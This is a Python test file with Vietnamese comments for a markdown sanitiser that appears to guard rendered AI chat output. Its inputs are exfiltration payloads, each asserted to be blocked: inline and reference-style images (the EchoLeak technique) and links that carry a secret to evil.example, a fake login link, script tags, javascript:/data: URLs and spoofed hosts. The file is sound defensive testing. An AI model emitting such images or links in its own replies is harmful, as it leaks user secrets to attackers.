from safe_render import SafeMarkdown

md = SafeMarkdown(image_hosts={"cdn.shop.vn"}, link_hosts={"shop.vn", "docs.shop.vn"})
r = md.render

# 1. ảnh inline tới host lạ mang dữ liệu trong query string: không có <img>
h = r("Xong. ![x](https://evil.example/p.png?d=SECRET123)")
assert "<img" not in h and "SECRET123" not in h and "[ảnh bị chặn: evil.example]" in h, h

# 2. ảnh kiểu reference (kỹ thuật của EchoLeak): cũng bị chặn
h = r("Xem ![logo][a]\n\n[a]: https://evil.example/i.png?d=SECRET123")
assert "<img" not in h and "SECRET123" not in h, h

# 3. link kiểu reference tới host lạ: thành chữ, không có href
h = r("Bấm [vào đây][r] để đăng nhập lại.\n\n[r]: https://evil.example/login?k=SECRET123")
assert "<a" not in h and "SECRET123" not in h and "vào đây [link bị chặn: evil.example]" in h, h

# 4. autolink tới host lạ
h = r("<https://evil.example/?d=SECRET123>")
assert "<a" not in h and "[link bị chặn: evil.example]" in h, h

# 5. HTML thô: bị escape, không thành thẻ
h = r('<img src="https://evil.example/?d=1"> <script>alert(1)</script>')
assert "<img" not in h and "<script" not in h and "&lt;img" in h, h

# 6. javascript:, data:, http (không phải https), host giả dạng
for url in ("javascript:alert(1)", "data:text/html;base64,PHNjcmlwdD4=", "http://shop.vn/x",
            "https://shop.vn.evil.example/x", "https://evil.example/@shop.vn", "https://shop.vn@evil.example/"):
    h = r(f"[x]({url})")
    assert "<a" not in h, (url, h)

# 7. host trong allowlist: giữ link, thêm rel; ảnh từ CDN được phép
h = r("[Hướng dẫn](https://docs.shop.vn/a?b=1) ![sp](https://cdn.shop.vn/sp.png)")
assert '<a href="https://docs.shop.vn/a?b=1" rel="noopener noreferrer nofollow">Hướng dẫn</a>' in h, h
assert '<img src="https://cdn.shop.vn/sp.png" alt="sp"' in h, h

# 8. link lồng ảnh: link lạ bọc ảnh hợp lệ -> bỏ link, giữ ảnh
h = r("[![sp](https://cdn.shop.vn/sp.png)](https://evil.example/?d=1)")
assert "<a" not in h and "<img" in h and "[link bị chặn: evil.example]" in h, h

# 9. emoji ghép (variation selector, zero-width joiner) giữ nguyên khi render
heart, family = "\u2764\ufe0f", "\U0001F468\u200d\U0001F469\u200d\U0001F467"
h = r(f"Cảm ơn {heart} {family}")
assert heart in h and family in h, h

# 10. chữ thường và định dạng giữ nguyên
h = r("**Đơn hàng** đã giao.\n\n- một\n- hai")
assert "<strong>Đơn hàng</strong>" in h and "<li>hai</li>" in h, h
print("RENDER OK")
